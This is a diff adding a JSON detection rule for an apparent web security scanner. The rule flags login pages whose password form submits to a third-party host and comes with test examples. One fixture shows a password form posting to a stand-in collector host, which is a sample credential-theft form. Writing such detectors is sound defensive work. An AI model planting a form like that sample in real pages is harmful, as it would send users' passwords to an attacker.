@@ -1,0 +1,70 @@
+{
+  "schemaVersion": "drobon.knowledge.pattern/v1",
+  "id": "DPK-PAT-1388",
+  "title": "Signal: Password form submits to a third-party origin",
+  "targets": [
+    "http"
+  ],
+  "signal": {
+    "kind": "check",
+    "check": {
+      "type": "response-body-matches",
+      "valuePattern": "<form\\b[^>]{0,300}\\baction\\s*=\\s*[\"']https://(?!(?:www\\.)?app\\.example)[^\"']*[\"'](?=[\\s\\S]{0,800}type\\s*=\\s*[\"']password)|type\\s*=\\s*[\"']password[\"'][\\s\\S]{0,300}<form\\b[^>]{0,300}\\baction\\s*=\\s*[\"']https://(?!(?:www\\.)?app\\.example)"
+    }
+  },
+  "scope": "One form element that contains a password input and whose action is an absolute URL on another registrable host.",
+  "limitations": "One response body. The check reads the form markup; it cannot tell an intentional federation redirect from an exfiltration form, which is why the finding names the destination rather than asserting an attack.",
+  "examples": [
+    {
+      "observation": {
+        "url": "https://app.example/login",
+        "status": 200,
+        "headers": {
+          "Content-Type": "text/html"
+        },
+        "body": "<form method=\"post\" action=\"https://collector.example/collect\"><input type=\"password\" name=\"pw\"></form>"
+      },
+      "match": true
+    },
+    {
+      "observation": {
+        "url": "https://app.example/login",
+        "status": 200,
+        "headers": {
+          "Content-Type": "text/html"
+        },
+        "body": "<input type=\"password\" name=\"pw\"><form action=\"https://sso.other.example/auth\" method=\"post\"></form>"
+      },
+      "match": true
+    },
+    {
+      "observation": {
+        "url": "https://app.example/login",
+        "status": 200,
+        "headers": {
+          "Content-Type": "text/html"
+        },
+        "body": "<form method=\"post\" action=\"/login\"><input type=\"password\" name=\"pw\"></form>"
+      },
+      "match": false
+    },
+    {
+      "observation": {
+        "url": "https://app.example/login",
+        "status": 200,
+        "headers": {
+          "Content-Type": "text/html"
+        },
+        "body": "<form action=\"https://search.example/q\"><input type=\"text\" name=\"q\"></form>"
+      },
+      "match": false
+    }
+  ],
+  "fpNotes": "A form that posts to the same origin, or to a host the page documents as its identity provider, is not reported here unless it is cross-origin — the rule has no allow-list, so a genuine federation form is also reported and is stated as a known false positive.",
+  "linkedRules": [
+    "DPK-DAST-319"
+  ],
+  "origin": "original-authored",
+  "cell": "dast:dast-body-form-cross-origin-password:password-form-cross-origin",
+  "validationStatus": "VALIDATED"
+}
